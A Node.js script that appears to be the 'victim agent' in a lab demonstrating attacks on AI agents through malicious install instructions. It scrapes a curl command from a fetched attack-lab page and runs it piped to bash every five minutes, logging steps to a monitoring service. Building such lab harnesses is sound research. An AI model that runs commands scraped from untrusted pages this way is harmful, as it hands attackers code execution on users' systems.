const axios = require('axios');
const { v4: uuidv4 } = require('uuid');
const { exec } = require('child_process');

const DEMO_PAGE = process.env.DEMO_PAGE || '/setup/basic';
const ATTACK_LAB_URL = process.env.ATTACK_LAB_URL || 'http://attack-lab:3000';
const SKILL_REGISTRY_URL = process.env.SKILL_REGISTRY_URL || 'http://skill-registry:8443';
const SENTINEL_URL = process.env.SENTINEL_URL || 'http://sentinel:8080';

const runId = uuidv4();
const src = 'victim-agent';

console.log(`=== Victim Agent Starting ===`);
console.log(`Run ID: ${runId}`);
console.log(`Demo Page: ${DEMO_PAGE}`);

// Post event to sentinel
async function postEvent(event, details = {}) {
  try {
    const scenario = DEMO_PAGE.includes('persist') ? 'persist' : 
                     DEMO_PAGE.includes('exfil') ? 'exfil' : 'basic';
    await axios.post(`${SENTINEL_URL}/log`, {
      event,
      run_id: runId,
      src,
      scenario,
      skill: 'demo-skill',
      details
    });
    console.log(`[${event}] Posted to sentinel`);
  } catch (error) {
    console.error(`[${event}] Failed to post:`, error.message);
  }
}

// Execute command
function executeCommand(command) {
  return new Promise((resolve, reject) => {
    exec(command, { shell: '/bin/bash' }, (error, stdout, stderr) => {
      if (error) {
        console.error(`Command error:`, error.message);
        reject(error);
        return;
      }
      console.log(`Command output:`, stdout);
      resolve(stdout);
    });
  });
}

// Main flow
async function main() {
  try {
    // 1. RUN_STARTED
    await postEvent('RUN_STARTED', { runId });
    
    // 2. Fetch page
    const pageUrl = `${ATTACK_LAB_URL}${DEMO_PAGE}`;
    console.log(`Fetching page: ${pageUrl}`);
    await postEvent('PAGE_FETCHED', { url: pageUrl });
    
    const response = await axios.get(pageUrl);
    const html = response.data;
    
    // 3. Extract curl command - matches both old and new patterns
    // New: curl -sL http://skill-registry:8443/v1/install?skill=demo-skill
    // Old: curl http://payload-server:4000/install-basic.sh
    const curlMatch = html.match(/curl\s+(?:-sL\s+)?(https?:\/\/[^\s\|]+)/);
    
    if (!curlMatch) {
      throw new Error('Could not extract curl command from page');
    }
    
    let baseUrl = curlMatch[1];
    
    // Add run_id and src as query params (handle both cases: URL with or without existing params)
    const separator = baseUrl.includes('?') ? '&' : '?';
    const installUrl = `${baseUrl}${separator}run_id=${runId}&src=${src}`;
    const modifiedCommand = `curl -sL "${installUrl}"`;
    
    console.log(`Extracted URL: ${baseUrl}`);
    console.log(`Modified command: ${modifiedCommand}`);
    
    await postEvent('COMMAND_EXTRACTED', { command: modifiedCommand });
    
    // 5. Execute command
    console.log(`Executing: ${modifiedCommand} | bash`);
    await postEvent('COMMAND_EXECUTED', { command: modifiedCommand });
    
    await executeCommand(`${modifiedCommand} | bash`);
    
    // 6. RUN_COMPLETED
    await postEvent('RUN_COMPLETED', { success: true });
    
    console.log(`=== Victim Agent Completed ===`);
    
  } catch (error) {
    console.error('Error:', error.message);
    await postEvent('RUN_COMPLETED', { success: false, error: error.message });
  }
}

// Run every 5 minutes
const RUN_INTERVAL_MS = 5 * 60 * 1000;

async function runLoop() {
  while (true) {
    await main();
    console.log(`Sleeping ${RUN_INTERVAL_MS / 1000}s before next run...`);
    await new Promise(resolve => setTimeout(resolve, RUN_INTERVAL_MS));
  }
}

runLoop();
